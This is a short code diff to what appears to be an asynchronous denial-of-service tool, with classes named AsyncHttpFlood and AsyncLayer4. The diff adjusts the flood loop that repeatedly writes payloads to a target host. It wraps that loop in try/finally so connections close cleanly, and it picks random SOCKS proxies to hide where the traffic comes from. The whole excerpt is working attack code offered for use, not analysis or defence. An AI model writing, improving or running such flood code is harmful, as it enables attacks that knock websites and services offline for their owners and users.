@@ -909,12 +909,10 @@ class AsyncHttpFlood(HttpFlood):
         is_tls = self._target.scheme.lower() == "https" or self._target.port == 443
         if self._proxies:
             proxy_url: str = self._proxies.pick_random()
-            # XXX: use sendall directly to avoid streams overhead (at least 2x)
             reader, writer = await aiohttp_socks.open_connection(
                 proxy_url=proxy_url,
                 host=self._target.host,
                 port=self._target.port,
-                #remote_resolve=False,
                 ssl=ctx if is_tls else None
             )
         else:
@@ -929,13 +927,15 @@ class AsyncHttpFlood(HttpFlood):
         rpc = rpc or self._rpc
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        for _ in range(rpc):
-            writer.write(payload)
-            await asyncio.wait_for(writer.drain(), timeout=1)
-            self._stats.track(1, packet_size)
-            packets_sent += 1
-        writer.close()
-        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        try:
+            for _ in range(rpc):
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                self._stats.track(1, packet_size)
+                packets_sent += 1
+        finally:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
     # XXX: again, with functions it's just a partial
@@ -1143,15 +1143,15 @@ class AsyncHttpFlood(HttpFlood):
         await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
+
 # XXX: the separation should be based on the socket type: TCP vs. UDP
+#      hence the code duplication for open_connection method
 class AsyncLayer4(Layer4):
 
     async def run(self) -> int:
         return await self.SENT_FLOOD()
 
     # note that TCP_NODELAY is set by default since Python3.6+
-    # XXX: for TCP only connection it should not be defined here,
-    #      as it's absolutely the same thing we do for L7
     async def open_connection(
         self,
         conn_type=AF_INET,
